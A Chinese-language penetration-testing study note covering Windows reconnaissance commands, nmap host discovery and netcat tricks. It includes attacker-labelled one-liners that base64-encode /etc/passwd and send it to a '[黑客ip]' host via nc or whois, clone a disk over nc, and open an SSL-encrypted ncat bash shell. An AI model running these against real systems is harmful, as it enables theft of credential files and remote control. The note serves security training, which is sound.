# 渗透测试基础05

# 信息搜集工具的使用（windows本地信息搜集、远程信息搜集-利用网站、活跃主机识别-利用工具、kali的nc加密传输、nc 远程克隆备份linux硬盘取证、ncat、域环境）

bitvise远程连接kali

## 信息搜集：

### windows本地信息搜集：

```
whoami   #查看自己身份
whoami /all   #获取当前域的信息
ipconfig /all     #查看详细ip信息

arp -a     #查看arp表

systeminfo    #查看操作系统信息

echo %PROCESSOR_ARCHITECTURE%    #查看cpu型号

wmic product get name,version  #查看安装软件和版本信息

wmic qfe get Caption,Description,HotFixID,InstalledOn  #查看补丁列表

net user  #查看本地用户

net session  #显示本地和远程的会话

wmic process list brief   #查看进程

net view   #查看内网的共享

```



### 远程信息搜集：

网站:
http://seo.chinaz.com/

http://whois.chinaz.com/



**活跃主机识别**：

```
nmap -sP [网段]   ##活跃主机识别

nping -tcp -p 445 -data [十六进制数据，例如0xab] [目标ip]    #对目标ip的445端口，以tcp的方式发送一串十六进制数据
（可以通过以上方法模拟常见网络攻击，可以测试对方的防御效果）

#zenmap就是nmap的图形界面版本

nmap -sV [目标ip]   #服务指纹识别

amap -bq [目标ip] [端口]    #服务枚举

nc -nvz [ip] 1-65535    #使用windows的nc进行扫描
```



## kali的nc加密传输

2 目标：

```
cat /etc/passwd | base64 | nc -nv [黑客ip] 3333 -q 1

#/etc/passwd敏感目录
#/etc/shadow敏感目录
#把查看到的结果进行base64加密，将结果通过nc连接黑客的3333端口，传完之后立马退出
```

1 黑客：

```
nc -l -p 3333 > kali.txt   #监听3333端口，并将监听到的东西存放到kali.txt里
```



**传输文件**
2 目标：

```
nc -nv [黑客ip] 3333 < [要传的文件] -q 1
```

1 黑客:

```
nc -lp 3333 > xx.txt
```



## nc 远程克隆备份linux硬盘：【取证】

黑客（最好也是linux系统）：

```
nc -lp 3333 | dd of=/dev/sda
#o表示on方向，输出
```

目标：

```
dd if=/dev/sda | nc -nv [黑客ip] 3333 -q 1
#i表示in方向，输入
```



## nc 其他用法

两台linux系统：

适用于传输小的文件，whois也可以用于payload反弹 

目标 （没有nc，需要用合法方法传输）

````
whois -h [黑客ip] -p 4444 `cat /etc/passwd | base64` 
````

黑客自己 

```
nc -l -v -p 4444 | sed "s/ //g" | base64 -d 
#自己解码
```



**注意**：nc传输内容都是明文的

所以需要**ncat**



## nc加密版ncat

**ncat**大多数情况在**nmap**的工具包里

`--help`查看可用命令



目标(linux。如果是windows系统，bash改成cmd)：

```
ncat -c bash --allow [黑客ip] -vnl 3333 --ssl  
#只允许黑客的ip使用ssl加密去控制它
```

黑客：

```
ncat -nv [目标ip] 3333 --ssl 
```





## 域环境：

AD（active directiory）活动目录服务器

https://www.cnblogs.com/cnjavahome/p/9029665.html



exchange服务器



